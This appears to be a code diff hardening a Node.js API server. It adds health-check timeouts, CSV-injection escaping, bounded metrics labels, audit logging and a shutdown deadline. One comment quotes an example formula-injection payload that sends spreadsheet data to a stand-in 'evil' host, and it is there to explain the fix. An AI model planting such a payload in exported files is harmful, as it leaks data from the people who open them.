@@ -341,13 +341,19 @@ async function handleNotesIndex(req, res) {
 // answer; 503 otherwise. Kept lightweight (no git, no inventory) so it
 // can be hit every 5-10s by an orchestrator without load.
 async function handleReadyz(req, res) {
+  // vt-0232: each subsystem check capped at 2s. A wedged pg/secrets
+  // backend would otherwise hang the response indefinitely (no client
+  // timeout on pg.query by default) — orchestrators retry every 5s,
+  // sockets accumulate.
+  const withTimeout = (p, ms) => Promise.race([
+    p,
+    new Promise((_, rej) => setTimeout(() => rej(new Error(`timeout >${ms}ms`)), ms)),
+  ]);
   const checks = {};
   let ok = true;
-  // pg
-  try { await pg.query('SELECT 1'); checks.pg = 'ok'; }
+  try { await withTimeout(pg.query('SELECT 1'), 2000); checks.pg = 'ok'; }
   catch (e) { ok = false; checks.pg = 'fail: ' + scrubError(e.message); }
-  // secrets backend (use a fast probe — list, not get)
-  try { await secretsBackend().list(); checks.secrets = 'ok'; }
+  try { await withTimeout(secretsBackend().list(), 2000); checks.secrets = 'ok'; }
   catch (e) { ok = false; checks.secrets = 'fail: ' + scrubError(e.message); }
   send(res, ok ? 200 : 503, { ready: ok, checks });
 }
@@ -411,10 +417,22 @@ async function handleAuditFeed(req, res) {
   }
   if (format === 'csv') {
     const header = 'ts,source,op,subject,caller_id,via,outcome,extra';
+    // vt-0228: CSV injection neutralization. A subject like
+    //   =HYPERLINK("http://evil/?"&A1,"click")
+    // executes when an operator opens the CSV in Excel/Sheets. Prefix
+    // values starting with any of [=+\-@\t\r] with a single quote so
+    // they're treated as plain text.
+    const csvSafe = (v) => {
+      const s = String(v);
+      const lead = s.charAt(0);
+      const escaped = (lead === '=' || lead === '+' || lead === '-' || lead === '@' || lead === '\t' || lead === '\r')
+        ? "'" + s : s;
+      return `"${escaped.replace(/"/g, '""')}"`;
+    };
     const body = rows.map(r => [
       r.ts.toISOString(), r.source, r.op, r.subject || '', r.caller_id || '',
       r.via || '', r.outcome || '', r.extra || '',
-    ].map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')).join('\n');
+    ].map(csvSafe).join(',')).join('\n');
     res.writeHead(200, { 'content-type': 'text/csv; charset=utf-8', 'content-disposition': 'attachment; filename="audit.csv"' });
     res.end(header + '\n' + body);
     return;
@@ -986,6 +1004,29 @@ const fleetCtx = fleetRoutes.makeContext({ token: TOKEN, adminToken: FLEET_ADMIN
 const log = require('./lib/log').for('rag-api');
 const { requestId } = require('./lib/log');
 
+// vt-0227: stable route templates for /metrics labels. Any segment that
+// looks like a uuid, sha, or note-path is collapsed to ":id" / ":sha"
+// / ":path". Unknown top-level paths are bucketed to ":other" so an
+// attacker can't grow the label set with a crafted URL.
+const UUID_RE = /^[0-9a-f-]{36}$/i;
+const SHA_RE  = /^[0-9a-f]{8,64}$/i;
+function routeTemplate(path) {
+  if (!path || path === '/') return '/';
+  const parts = path.split('/').filter(Boolean);
+  // Known top-level prefixes for the hub API.
+  const TOP = new Set([
+    'healthz', 'readyz', 'metrics', 'search', 'get', 'put', 'backlinks',
+    'secrets', 'task', 'notes', 'fleet', 'audit', 'workflows', 'tokmon', 'mcp',
+  ]);
+  if (!TOP.has(parts[0])) return '/:other';
+  return '/' + parts.map(p => {
+    if (UUID_RE.test(p)) return ':id';
+    if (SHA_RE.test(p))  return ':sha';
+    if (p.endsWith('.md')) return ':note';
+    return p;
+  }).join('/');
+}
+
 // vt-0211: Prometheus metrics.
 const metrics = require('./lib/metrics');
 const _reqCount = metrics.counter('rag_api_requests_total', 'HTTP requests by method+status', ['method', 'status']);
@@ -1013,7 +1054,11 @@ const server = http.createServer(async (req, res) => {
     if (path === '/healthz' || path === '/readyz' || path === '/metrics') return;
     const ms = Date.now() - t0;
     _reqCount.inc({ method: req.method, status: String(res.statusCode) });
-    _reqDur.observe({ path }, ms);
+    // vt-0227: collapse high-cardinality path segments (UUIDs, sha hashes,
+    // free-form note paths) into a stable route template. Without this,
+    // every unique session/host/note id is a permanent map entry → memory
+    // leak + scrape size blow-up.
+    _reqDur.observe({ path: routeTemplate(path) }, ms);
     log.info('http_request', { req_id: reqId, method: req.method, path, status: res.statusCode, ms });
   });
   if (req.method === 'GET' && req.url === '/healthz') return send(res, 200, { ok: true });
@@ -1303,6 +1348,16 @@ fleetRoutes.attachUpgrade(server, () => fleetCtx);
             const runner = await fleetRoutes.ensureWorkflowRunner(fleetCtx);
             if (runner) runner.start(run.id);
             console.log(`[rag-api] trigger fired: workflow=${w.name} run=${run.id}`);
+            // vt-0231: audit cron-fired runs. caller_id is 'cron' (not a
+            // bearer hash) so the source is unambiguous in the audit table.
+            try {
+              const defSha = require('crypto').createHash('sha256').update(JSON.stringify(w.definition)).digest('hex');
+              await pg.query(
+                `INSERT INTO workflow_audit (op, workflow_id, run_id, caller_id, via, outcome, definition_sha)
+                 VALUES ('run', $1, $2, 'cron', 'cron', 'ok', $3)`,
+                [w.id, run.id, defSha]
+              );
+            } catch (e) { console.error(`[rag-api] cron workflow_audit insert failed: ${e.message}`); }
           } catch (e) {
             console.error(`[rag-api] trigger fire failed for ${w.name}: ${e.message}`);
           }
@@ -1382,32 +1437,49 @@ fleetRoutes.attachUpgrade(server, () => fleetCtx);
 // vt-0212: graceful shutdown. The naive `server.close` left WS clients
 // dangling (keeps the loop alive past close), pg connections orphaned,
 // and any pending event-batcher writes lost on hub restart.
+// vt-0233: enforce the 10s deadline via Promise.race — earlier shape
+// would await batcher.flush() unconditionally and the deadline only
+// padded the final sleep, never aborting a hung flush.
 let _shuttingDown = false;
 async function shutdown(signal) {
-  if (_shuttingDown) return;
+  if (_shuttingDown) {
+    console.log(`[rag-api] already shutting down, ignoring ${signal}`);
+    return;
+  }
   _shuttingDown = true;
   console.log(`[rag-api] ${signal} received — graceful shutdown`);
-  const deadline = Date.now() + 10_000;  // 10s hard timeout
-  // Stop accepting new connections + close idle keep-alives.
-  server.closeIdleConnections?.();
-  server.close((err) => {
-    if (err) console.error(`[rag-api] server.close error: ${err.message}`);
-  });
-  // Close every WS so .close() actually returns.
+  const DEADLINE_MS = 10_000;
+  const doShutdown = async () => {
+    server.closeIdleConnections?.();
+    server.close((err) => {
+      if (err) console.error(`[rag-api] server.close error: ${err.message}`);
+    });
+    try {
+      const wss = server._fleetWss;
+      if (wss) for (const ws of wss.clients) {
+        try { ws.close(1001, 'shutdown'); } catch {}
+      }
+    } catch (e) { console.error(`[rag-api] WS drain error: ${e.message}`); }
+    try { await fleetCtx?.batcher?.flush?.(); }
+    catch (e) { console.error(`[rag-api] batcher flush error: ${e.message}`); }
+    await cleanup();
+  };
+  const deadline = new Promise(r => setTimeout(r, DEADLINE_MS));
+  let exitCode = 0;
   try {
-    const wss = server._fleetWss;
-    if (wss) for (const ws of wss.clients) {
-      try { ws.close(1001, 'shutdown'); } catch {}
+    const winner = await Promise.race([
+      doShutdown().then(() => 'clean'),
+      deadline.then(() => 'deadline'),
+    ]);
+    if (winner === 'deadline') {
+      console.error('[rag-api] shutdown deadline hit — forcing exit');
+      exitCode = 1;
     }
-  } catch (e) { console.error(`[rag-api] WS drain error: ${e.message}`); }
-  // Flush event batcher (pty transcript queue) before pg closes.
-  try { await fleetCtx?.batcher?.flush?.(); }
-  catch (e) { console.error(`[rag-api] batcher flush error: ${e.message}`); }
-  // Cleanup pg pools.
-  await cleanup();
-  const remaining = deadline - Date.now();
-  if (remaining > 0) await new Promise(r => setTimeout(r, Math.min(remaining, 500)));
-  process.exit(0);
+  } catch (e) {
+    console.error(`[rag-api] shutdown error: ${e.message}`);
+    exitCode = 1;
+  }
+  process.exit(exitCode);
 }
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('SIGINT',  () => shutdown('SIGINT'));
